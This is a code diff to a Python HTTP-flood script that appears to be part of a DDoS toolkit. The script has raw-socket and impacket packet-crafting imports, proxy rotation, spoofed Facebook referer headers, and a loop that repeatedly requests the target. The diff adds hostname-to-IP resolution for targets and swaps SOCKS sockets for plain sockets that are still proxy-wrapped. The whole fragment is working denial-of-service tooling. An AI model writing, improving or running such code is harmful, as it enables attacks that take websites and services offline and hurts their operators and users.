@@ -1,6 +1,5 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-
 from contextlib import suppress
 from itertools import cycle
 from json import load
@@ -9,7 +8,7 @@ from os import urandom as randbytes
 from pathlib import Path
 from random import randint, choice as randchoice
 from socket import (IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, TCP_NODELAY, SOCK_STREAM, AF_INET, socket,
-                    SOCK_DGRAM, SOCK_RAW, gethostname)
+                    SOCK_DGRAM, SOCK_RAW, gethostname, gethostbyname)
 from ssl import SSLContext, create_default_context, CERT_NONE
 from sys import argv, exit
 from threading import Thread, Event, Lock
@@ -24,7 +23,6 @@ from icmplib import ping
 from impacket.ImpactPacket import IP, TCP, UDP, Data
 from psutil import process_iter, net_io_counters, virtual_memory, cpu_percent
 from requests import get, Session, exceptions
-from socks import socksocket
 from yarl import URL
 
 localIP = get('http://ip.42.pl/raw').text
@@ -222,6 +220,9 @@ class HttpFlood(Thread):
         self._target = target
         self._raw_target = (self._target.host, (self._target.port or 80))
 
+        if not ProxyTools.Patterns.IP.match(self._target.host):
+            self._raw_target = (gethostbyname(self._target.host), (self._target.port or 80))
+
         if not referers:
             referers: List[str] = ["https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
                                    ",https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer"
@@ -283,8 +284,8 @@ class HttpFlood(Thread):
         print(payload)
         return str.encode(f"{payload}\r\n")
 
-    def open_connection(self) -> socksocket:
-        sock = socksocket(AF_INET, SOCK_STREAM)
+    def open_connection(self) -> socket:
+        sock = socket(AF_INET, SOCK_STREAM)
         if self._proxies:
             sock = next(self._proxies).wrap(sock)
 
@@ -483,7 +484,6 @@ class HttpFlood(Thread):
             if pro: s = pro.wrap(s)
             for _ in range(self._rpc):
                 s.get(self._target.human_repr())
-
 
 
 class ProxyManager:
